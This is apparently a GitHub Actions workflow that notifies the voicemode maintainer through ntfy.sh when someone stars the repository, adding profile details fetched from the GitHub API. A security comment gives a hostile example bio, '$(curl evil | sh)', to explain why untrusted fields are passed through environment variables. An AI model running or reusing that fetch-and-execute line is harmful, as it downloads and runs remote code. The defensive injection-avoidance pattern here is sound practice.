name: Star Notification

on:
  watch:
    types: [started]

permissions:
  contents: read

jobs:
  notify:
    runs-on: ubuntu-latest
    steps:
      - name: Fetch stargazer profile
        id: profile
        env:
          GH_TOKEN: ${{ github.token }}
          ACTOR: ${{ github.actor }}
        run: |
          # Fetch user profile from GitHub API
          USER_DATA=$(curl -s -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/users/$ACTOR")

          # Extract profile fields
          FOLLOWERS=$(echo "$USER_DATA" | jq -r '.followers // 0')
          BIO=$(echo "$USER_DATA" | jq -r '.bio // "No bio"' | head -c 100)
          COMPANY=$(echo "$USER_DATA" | jq -r '.company // ""')
          LOCATION=$(echo "$USER_DATA" | jq -r '.location // ""')
          PUBLIC_REPOS=$(echo "$USER_DATA" | jq -r '.public_repos // 0')

          # Sanitize fields -- strip newlines and control chars to avoid GITHUB_OUTPUT format errors
          BIO=$(echo "$BIO" | tr '\n\r' '  ' | sed 's/[[:cntrl:]]//g')
          COMPANY=$(echo "$COMPANY" | tr '\n\r' '  ' | sed 's/[[:cntrl:]]//g')
          LOCATION=$(echo "$LOCATION" | tr '\n\r' '  ' | sed 's/[[:cntrl:]]//g')

          # Set outputs
          echo "followers=$FOLLOWERS" >> "$GITHUB_OUTPUT"
          echo "bio=$BIO" >> "$GITHUB_OUTPUT"
          echo "company=$COMPANY" >> "$GITHUB_OUTPUT"
          echo "location=$LOCATION" >> "$GITHUB_OUTPUT"
          echo "public_repos=$PUBLIC_REPOS" >> "$GITHUB_OUTPUT"

          # Determine priority based on follower count
          if [ "$FOLLOWERS" -ge 500 ]; then
            echo "priority=high" >> "$GITHUB_OUTPUT"
            echo "tags=star,github,notable" >> "$GITHUB_OUTPUT"
          elif [ "$FOLLOWERS" -ge 100 ]; then
            echo "priority=default" >> "$GITHUB_OUTPUT"
            echo "tags=star,github" >> "$GITHUB_OUTPUT"
          else
            echo "priority=low" >> "$GITHUB_OUTPUT"
            echo "tags=star,github" >> "$GITHUB_OUTPUT"
          fi

      - name: Send ntfy notification
        # Profile fields are attacker-controlled (anyone can star). They reach
        # the shell only through env, never through ${{ }} inside run:, so a
        # bio like $(curl evil | sh) stays a string.
        env:
          ACTOR: ${{ github.actor }}
          FOLLOWERS: ${{ steps.profile.outputs.followers }}
          PUBLIC_REPOS: ${{ steps.profile.outputs.public_repos }}
          COMPANY: ${{ steps.profile.outputs.company }}
          LOCATION: ${{ steps.profile.outputs.location }}
          BIO: ${{ steps.profile.outputs.bio }}
          PRIORITY: ${{ steps.profile.outputs.priority }}
          TAGS: ${{ steps.profile.outputs.tags }}
          STARGAZERS: ${{ github.event.repository.stargazers_count }}
          NTFY_TOPIC: ${{ secrets.NTFY_TOPIC }}
        run: |
          # Build notification body with profile info
          BODY="🎉 $ACTOR just starred voicemode!

          👥 Followers: $FOLLOWERS
          📦 Repos: $PUBLIC_REPOS"

          # Add optional fields if present
          if [ -n "$COMPANY" ]; then
            BODY="$BODY
          🏢 $COMPANY"
          fi

          if [ -n "$LOCATION" ]; then
            BODY="$BODY
          📍 $LOCATION"
          fi

          if [ "$BIO" != "No bio" ]; then
            BODY="$BODY

          💬 $BIO"
          fi

          BODY="$BODY

          ⭐ Total: $STARGAZERS"

          curl -H "Title: VoiceMode ⭐ New Star!" \
               -H "Priority: $PRIORITY" \
               -H "Tags: $TAGS" \
               -H "Click: https://github.com/$ACTOR" \
               -d "$BODY" \
               "https://ntfy.sh/$NTFY_TOPIC"
